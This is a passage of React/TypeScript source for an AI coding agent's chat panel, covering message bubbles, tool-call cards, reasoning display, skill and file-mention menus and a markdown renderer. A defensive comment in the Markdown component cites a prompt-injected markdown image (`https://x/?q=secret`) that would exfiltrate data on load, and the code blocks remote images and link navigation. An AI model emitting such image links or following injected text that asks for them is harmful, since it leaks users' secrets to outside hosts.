          className="flex w-full items-center gap-2 rounded-md border border-neutral-200 px-2.5 py-1.5 text-left text-[11px] text-neutral-500 hover:bg-neutral-100 dark:border-neutral-800 dark:hover:bg-neutral-800/50"
        >
          <Wrench size={12} />
          <span className="font-medium text-neutral-700 dark:text-neutral-300">Used {runs.length} tools</span>
          {failed > 0 && <Badge tone="amber">{failed} failed/denied</Badge>}
          <ChevronRight size={12} className="ml-auto" />
        </button>
      ) : (
        <>
          {collapsible && (
            <button
              onClick={() => setExpanded(false)}
              className="mb-1 flex items-center gap-1 text-[10px] text-neutral-500 hover:text-neutral-300"
            >
              <ChevronDown size={11} /> Hide {runs.length} tool calls
            </button>
          )}
          {runs.map((r) => (
            <div key={r.id}>
              <ToolRunCard run={r} onOpenPath={onOpenPath} onOpenDiff={onOpenDiff} />
              {approvalsByRun(r.id).map((a) => (
                <ApprovalCard key={a.id} approval={a} onOpenDiff={onOpenDiff} />
              ))}
            </div>
          ))}
        </>
      )}
      {looseApprovals.map((a) => (
        <ApprovalCard key={a.id} approval={a} onOpenDiff={onOpenDiff} />
      ))}
    </div>
  );
});

/** A turn that stopped early (step limit or a stuck tool loop). */
function PausedNotice({
  text,
  canContinue,
  onContinue,
}: {
  text: string;
  canContinue: boolean;
  onContinue: () => void;
}) {
  return (
    <div className="mb-4 flex items-start gap-2.5 rounded-md border border-amber-500/30 bg-amber-500/5 px-3 py-2.5">
      <Pause size={14} className="mt-0.5 shrink-0 text-amber-500" />
      <div className="min-w-0 flex-1 text-xs">
        <div className="font-semibold text-amber-600 dark:text-amber-400">Agent paused</div>
        <div className="md mt-0.5 text-neutral-600 dark:text-neutral-300">
          <ReactMarkdown remarkPlugins={[remarkGfm]}>{text}</ReactMarkdown>
        </div>
      </div>
      {canContinue && (
        <button
          onClick={onContinue}
          className="flex shrink-0 items-center gap-1 rounded-md bg-amber-500 px-2.5 py-1 text-[11px] font-medium text-white hover:bg-amber-400"
        >
          <Play size={11} fill="currentColor" /> Continue
        </button>
      )}
    </div>
  );
}

/** Subscribes to the streaming text on its own so the rest of the panel does
 *  not re-render for every token. */
function StreamingBubble({ full }: { full: boolean }) {
  const text = useChat((s) => s.streaming?.text ?? null);
  const reasoning = useChat((s) => s.streaming?.reasoning ?? "");
  if (text === null) return null;
  return (
    <div className={full ? "mb-5" : "mb-3"}>
      <AssistantLabel live />
      <div className={full ? "" : "border-l border-neutral-200 pl-3 dark:border-neutral-800"}>
        {reasoning && <ThinkingBlock text={reasoning} live={!text} />}
        {(text || !reasoning) && (
          <div className="md">
            <Markdown content={text} />
            <span className="ml-0.5 inline-block h-[1.05em] w-[0.55em] animate-pulse bg-accent-400 align-[-0.15em]" />
          </div>
        )}
      </div>
    </div>
  );
}

/** Model reasoning: open and following the tail while the model is still
 *  thinking, otherwise a collapsed toggle. */
function ThinkingBlock({ text, live = false }: { text: string; live?: boolean }) {
  const [open, setOpen] = useState(false);
  const bodyRef = useRef<HTMLDivElement>(null);
  const expanded = live || open;
  useLayoutEffect(() => {
    if (live && bodyRef.current) bodyRef.current.scrollTop = bodyRef.current.scrollHeight;
  }, [live, text]);
  return (
    <div className="mb-2">
      <button
        type="button"
        onClick={() => setOpen((o) => !o)}
        disabled={live}
        className="eyebrow flex items-center gap-1 !text-neutral-500 hover:!text-neutral-700 disabled:cursor-default dark:hover:!text-neutral-300"
      >
        {expanded ? <ChevronDown size={11} /> : <ChevronRight size={11} />}
        {live ? "Thinking…" : "Thinking"}
      </button>
      {expanded && (
        <div
          ref={bodyRef}
          className={`mt-1 whitespace-pre-wrap break-words border-l border-neutral-200 pl-3 font-mono text-[11px] leading-relaxed text-neutral-500 dark:border-neutral-800 ${
            live ? "max-h-40 overflow-y-auto" : ""
          }`}
        >
          {text}
        </div>
      )}
    </div>
  );
}

function AssistantLabel({ children, live }: { children?: React.ReactNode; live?: boolean }) {
  return (
    <div className="eyebrow mb-1.5 flex items-center gap-2 !text-neutral-500">
      <span className={`h-1.5 w-1.5 bg-accent-500 ${live ? "animate-pulse" : ""}`} />
      <span className="text-accent-600 dark:text-accent-400">Agent</span>
      {children}
    </div>
  );
}

const MessageBubble = memo(function MessageBubble({
  message,
  full,
  onOpenFile,
}: {
  message: MessageRecord;
  full: boolean;
  onOpenFile: (path: string) => void;
}) {
  const time = new Date(message.created_at).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  if (message.role === "user" && message.content.startsWith(COMPACTION_MARKER)) {
    return <SummaryCard content={message.content.slice(COMPACTION_MARKER.length).trim()} full={full} />;
  }
  const skillUse = message.role === "user" ? parseSkillInvocation(message.content) : null;
  const userText = splitAttachments(message.content);
  if (message.role === "user") {
    return (
      <div className={`group flex animate-rise flex-col ${full ? "mb-6 items-end" : "mb-4"}`}>
        <div className="eyebrow mb-1.5 flex items-center gap-2">
          You <span className="tracking-normal normal-case opacity-0 transition-opacity group-hover:opacity-100">{time}</span>
        </div>
        <div
          className={`whitespace-pre-wrap break-words rounded-[5px] border border-neutral-200 bg-white px-3 py-2 text-neutral-800 dark:border-neutral-800 dark:bg-neutral-900 dark:text-neutral-100 ${
            full ? "max-w-[80%] text-[13px]" : "w-full text-xs"
          }`}
        >
          {skillUse ? (
            <>
              <span className="mr-1.5 rounded-[3px] bg-accent-500/15 px-1 py-px font-mono text-[11px] text-accent-700 dark:text-accent-300">
                /{skillUse.name}
              </span>
              {skillUse.request}
            </>
          ) : (
            userText.text
          )}
          {(message.images?.length ?? 0) > 0 && <MessageImages images={message.images!} />}
          {userText.files.length > 0 && (
            <div className="mt-2 flex flex-wrap gap-1 whitespace-normal">
              {userText.files.map((f) => (
                <button
                  key={f}
                  title={`Attached: ${f}`}
                  onClick={() => onOpenFile(f)}
                  className="inline-flex max-w-full items-center gap-1 rounded-[3px] bg-accent-500/10 px-1.5 py-0.5 font-mono text-[10px] text-accent-700 hover:bg-accent-500/20 dark:text-accent-300"
                >
                  <Paperclip size={9} className="shrink-0" />
                  <span className="truncate">{f}</span>
                </button>
              ))}
            </div>
          )}
        </div>
      </div>
    );
  }
  return (
    <div className={`group animate-rise ${full ? "mb-6" : "mb-4"}`}>
      <AssistantLabel>
        {message.tool_calls.length > 0 && <Badge tone="accent">{message.tool_calls.length} tool call(s)</Badge>}
        <span className="ml-auto flex items-center gap-1 tracking-normal normal-case text-neutral-400 opacity-0 transition-opacity group-hover:opacity-100">
          {message.content && <CopyButton text={message.content} />}
          {time}
        </span>
      </AssistantLabel>
      <div className={full ? "" : "border-l border-neutral-200 pl-3 dark:border-neutral-800"}>
        {message.reasoning && <ThinkingBlock text={message.reasoning} />}
        {message.content ? (
          <Markdown content={message.content} onOpenFile={onOpenFile} />
        ) : (
          !message.reasoning && <span className="text-xs text-neutral-500">(tool calls only)</span>
        )}
      </div>
    </div>
  );
});

/** A user message sent as `/skill ...` is stored with the skill's
 *  instructions attached (see `skills::expand_slash_command`); show only the
 *  command and the request. */
/** Images of a user message; click one to see it full size. */
function MessageImages({ images }: { images: ImageAttachment[] }) {
  const [open, setOpen] = useState<number | null>(null);
  return (
    <div className="mt-2 whitespace-normal">
      <div className="flex flex-wrap gap-1.5">
        {images.map((img, i) => (
          <button key={i} onClick={() => setOpen(open === i ? null : i)} title="Show full size">
            <img
              src={imageUrl(img)}
              alt={`Image ${i + 1}`}
              className={`h-24 max-w-48 rounded-[4px] border object-cover ${
                open === i ? "border-accent-500" : "border-neutral-200 dark:border-neutral-700"
              }`}
            />
          </button>
        ))}
      </div>
      {open !== null && images[open] && (
        <img
          src={imageUrl(images[open])}
          alt={`Image ${open + 1}`}
          onClick={() => setOpen(null)}
          className="mt-1.5 max-h-[70vh] max-w-full cursor-zoom-out rounded-[4px] border border-neutral-200 dark:border-neutral-700"
        />
      )}
    </div>
  );
}

/** Header `context::pack_attachments` puts before attached file contents. */
const ATTACHED_MARKER = "\n\n--- Attached files ---";

/** A user message's own text and the names of the files attached to it
 *  (their contents went to the model; the chat shows just the names). */
function splitAttachments(content: string): { text: string; files: string[] } {
  const at = content.indexOf(ATTACHED_MARKER);
  if (at < 0) return { text: content, files: [] };
  const files = [...content.slice(at).matchAll(/\n\n`([^`\n]+)`:(?:\n| could not be read)/g)].map((m) => m[1]);
  return { text: content.slice(0, at), files };
}

function parseSkillInvocation(content: string): { name: string; request: string } | null {
  const m = /^<skill name="([^"]+)"/.exec(content);
  if (!m) return null;
  const marker = "Follow its instructions for this request:\n";
  const at = content.indexOf(marker);
  if (at < 0) return null;
  const request = content.slice(at + marker.length).split(ATTACHED_MARKER)[0];
  return { name: m[1], request: request.startsWith("(no further details given") ? "" : request };
}

/** `/` at the start of the composer lists the enabled skills; picking one
 *  inserts `/name `. Returns the popup and a key handler for the textarea
 *  (true when it handled the key). */
function useSlashMenu(input: string, setInput: (v: string) => void) {
  const skills = useSkills((s) => s.skills);
  const [index, setIndex] = useState(0);
  const [dismissed, setDismissed] = useState<string | null>(null);
  const query = /^\/([^\s]*)$/.exec(input)?.[1];
  useEffect(() => {
    if (query !== undefined && skills === null) void useSkills.getState().load();
  }, [query, skills]);
  const matches = useMemo(() => {
    if (query === undefined || !skills) return [];
    const q = query.toLowerCase();
    return skills
      .filter((s) => s.enabled && s.name.toLowerCase().includes(q))
      .sort((a, b) => Number(!a.name.toLowerCase().startsWith(q)) - Number(!b.name.toLowerCase().startsWith(q)))
      .slice(0, 8);
  }, [query, skills]);
  useEffect(() => setIndex(0), [query]);
  const open = matches.length > 0 && dismissed !== input;
  const pick = (name: string) => setInput(`/${name} `);

  const onKeyDown = (e: React.KeyboardEvent) => {
    if (!open) return false;
    if (e.key === "ArrowDown" || e.key === "ArrowUp") {
      e.preventDefault();
      setIndex((i) => (i + (e.key === "ArrowDown" ? 1 : matches.length - 1)) % matches.length);
      return true;
    }
    if (e.key === "Enter" || e.key === "Tab") {
      e.preventDefault();
      pick(matches[index].name);
      return true;
    }
    if (e.key === "Escape") {
      setDismissed(input);
      return true;
    }
    return false;
  };

  const menu = open ? (
    <div className="animate-rise absolute bottom-full left-0 z-20 mb-1 w-full max-w-md overflow-hidden rounded-[6px] border border-neutral-200 bg-white shadow-lg dark:border-neutral-800 dark:bg-neutral-900">
      <div className="eyebrow border-b border-neutral-200 px-2.5 py-1.5 dark:border-neutral-800">Skills</div>
      {matches.map((s, i) => (
        <button
          key={s.name}
          type="button"
          onMouseDown={(e) => {
            e.preventDefault();
            pick(s.name);
          }}
          onMouseEnter={() => setIndex(i)}
          className={`block w-full px-2.5 py-1.5 text-left ${i === index ? "bg-accent-500/10" : ""}`}
        >
          <div className="font-mono text-[11.5px] text-neutral-900 dark:text-neutral-100">/{s.name}</div>
          <div className="truncate text-[10.5px] text-neutral-500">{s.description}</div>
        </button>
      ))}
    </div>
  ) : null;

  return { menu, onKeyDown };
}

/** `@` file mentions: typing `@query` lists matching project files; picking
 *  one writes `@path` and attaches the file (its content goes with the
 *  message, see `context::pack_attachments`). */
function useMentionMenu(
  input: string,
  setInput: (v: string) => void,
  textareaRef: React.RefObject<HTMLTextAreaElement | null>,
  onPick: (path: string) => void,
) {
  const [files, setFiles] = useState<string[]>([]);
  const [index, setIndex] = useState(0);
  const [dismissed, setDismissed] = useState<string | null>(null);
  const caret = textareaRef.current?.selectionStart ?? input.length;
  const match = /(^|\s)@([^\s@]*)$/.exec(input.slice(0, caret));
  const query = match?.[2];

  useEffect(() => {
    if (query === undefined) return setFiles([]);
    let stale = false;
    const t = setTimeout(() => {
      api
        .fsFindFiles(query)
        .then((found) => !stale && setFiles(found.slice(0, 10)))
        .catch(() => !stale && setFiles([]));
    }, 80);
    return () => {
      stale = true;
      clearTimeout(t);
    };
  }, [query]);
  useEffect(() => setIndex(0), [query]);

  const open = query !== undefined && files.length > 0 && dismissed !== input;
  const pick = (path: string) => {
    if (query === undefined) return;
    const start = caret - query.length - 1;
    const next = `${input.slice(0, start)}@${path} ${input.slice(caret)}`;
    setInput(next);
    onPick(path);
    const pos = start + path.length + 2;
    requestAnimationFrame(() => textareaRef.current?.setSelectionRange(pos, pos));
  };

  const onKeyDown = (e: React.KeyboardEvent) => {
    if (!open) return false;
    if (e.key === "ArrowDown" || e.key === "ArrowUp") {
      e.preventDefault();
      setIndex((i) => (i + (e.key === "ArrowDown" ? 1 : files.length - 1)) % files.length);
      return true;
    }
    if (e.key === "Enter" || e.key === "Tab") {
      e.preventDefault();
      pick(files[index]);
      return true;
    }
    if (e.key === "Escape") {
      setDismissed(input);
      return true;
    }
    return false;
  };

  const menu = open ? (
    <div className="animate-rise absolute bottom-full left-0 z-20 mb-1 w-full max-w-lg overflow-hidden rounded-[6px] border border-neutral-200 bg-white shadow-lg dark:border-neutral-800 dark:bg-neutral-900">
      <div className="eyebrow border-b border-neutral-200 px-2.5 py-1.5 dark:border-neutral-800">Attach file</div>
      {files.map((f, i) => {
        const slash = f.lastIndexOf("/");
        return (
          <button
            key={f}
            type="button"
            onMouseDown={(e) => {
              e.preventDefault();
              pick(f);
            }}
            onMouseEnter={() => setIndex(i)}
            className={`flex w-full items-baseline gap-2 px-2.5 py-1 text-left ${i === index ? "bg-accent-500/10" : ""}`}
          >
            <span className="shrink-0 font-mono text-[11.5px] text-neutral-900 dark:text-neutral-100">{f.slice(slash + 1)}</span>
            <span className="min-w-0 truncate font-mono text-[10.5px] text-neutral-500">{slash > 0 ? f.slice(0, slash) : ""}</span>
          </button>
        );
      })}
    </div>
  ) : null;

  return { menu, onKeyDown };
}

/** Earlier turns were summarized to free context; the summary replaces them
 *  for the model (they stay visible above). */
function SummaryCard({ content, full }: { content: string; full: boolean }) {
  const [open, setOpen] = useState(false);
  return (
    <div className={`animate-rise rounded-[5px] border border-dashed border-neutral-300 dark:border-neutral-700 ${full ? "mb-6" : "mb-4"}`}>
      <button
        type="button"
        onClick={() => setOpen((o) => !o)}
        className="flex w-full items-center gap-1.5 px-3 py-2 text-left"
      >
        {open ? <ChevronDown size={12} /> : <ChevronRight size={12} />}
        <span className="eyebrow">Earlier conversation summarized</span>
        <span className="ml-auto text-[10.5px] text-neutral-500">the agent continues from this summary</span>
      </button>
      {open && (
        <div className="md border-t border-neutral-200 px-3 py-2 dark:border-neutral-800">
          <Markdown content={content} />
        </div>
      )}
    </div>
  );
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      title="Copy"
      className="rounded p-0.5 hover:bg-neutral-200 dark:hover:bg-neutral-800"
      onClick={() => {
        void navigator.clipboard.writeText(text).then(() => {
          setCopied(true);
          setTimeout(() => setCopied(false), 1200);
        });
      }}
    >
      {copied ? <Check size={11} /> : <Copy size={11} />}
    </button>
  );
}

const Markdown = memo(function Markdown({
  content,
  onOpenFile,
}: {
  content: string;
  onOpenFile?: (path: string) => void;
}) {
  const components = useMemo<Components>(
    () => ({
      // Model output is untrusted. Never let it navigate the webview, and
      // never auto-load remote images (a prompt-injected `![](https://x/?q=secret)`
      // would exfiltrate data without a click).
      a({ href, children }) {
        return (
          <a
            href={href}
            title={href ? `${href} — click to copy link` : undefined}
            onClick={(e) => {
              e.preventDefault();
              if (href) void navigator.clipboard.writeText(href);
            }}
          >
            {children}
          </a>
        );
      },
      img({ src, alt }) {
        return (
          <span className="rounded bg-neutral-200/70 px-1 text-[11px] text-neutral-500 dark:bg-neutral-800" title={typeof src === "string" ? src : undefined}>
            [image: {alt || "blocked"}]
          </span>
        );
      },
      code({ className, children, ...props }) {
        const isBlock = /language-/.test(className ?? "");
        if (!isBlock && onOpenFile) {
          const text = String(children);
          // Render inline paths as clickable links to the editor.
          if (/^[\w./-]+\.[A-Za-z0-9]{1,5}$/.test(text) && text.includes("/") && !text.includes("..")) {
            return (
              <code className="cursor-pointer hover:underline" onClick={() => onOpenFile(text)} title={`Open ${text}`} {...props}>
                {children}
              </code>
            );
          }
        }
        return (
          <code className={className} {...props}>
            {children}
          </code>
        );
      },
    }),
    [onOpenFile],
  );
  return (
    <div className="md">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {content}
      </ReactMarkdown>
    </div>
  );
});

function Menu({
  children,
  onClose,
  wide,
  up,
  align = "left",
}: {
  children: React.ReactNode;
  onClose: () => void;
  wide?: boolean;
  up?: boolean;
  align?: "left" | "right";
}) {
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => e.key === "Escape" && onClose();
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);
  return (
    <>
      <div className="fixed inset-0 z-30" onClick={onClose} />
      <div
        className={`absolute z-40 ${up ? "bottom-full mb-1" : "top-full mt-1"} ${align === "right" ? "right-0" : "left-0"} ${
          wide ? "w-72" : "w-48"
        } overflow-y-auto rounded-md border border-neutral-200 bg-white py-1 shadow-xl dark:border-neutral-700 dark:bg-neutral-900`}
        style={{ maxHeight: 340 }}
      >
        {children}
      </div>
    </>
  );
}

function MenuItem({
  children,
  onClick,
  active,
}: {
  children: React.ReactNode;
  onClick: () => void | Promise<void>;
  active?: boolean;
}) {
  return (
    <button
      onClick={onClick}
      className={`flex w-full items-center gap-1 px-3 py-1.5 text-left text-xs hover:bg-neutral-100 dark:hover:bg-neutral-800 ${
        active ? "text-accent-600 dark:text-accent-400" : ""
      }`}
    >
      {children}
    </button>
  );
}

/** Workspace-relative path for `abs`, or null if it is outside `root`. */
function relativeTo(root: string, abs: string): string | null {
  const norm = (p: string) => p.replace(/\\/g, "/").replace(/\/+$/, "");
  const r = norm(root);
  const a = norm(abs);
  if (a === r || !a.startsWith(`${r}/`)) return null;
  return a.slice(r.length + 1);
}
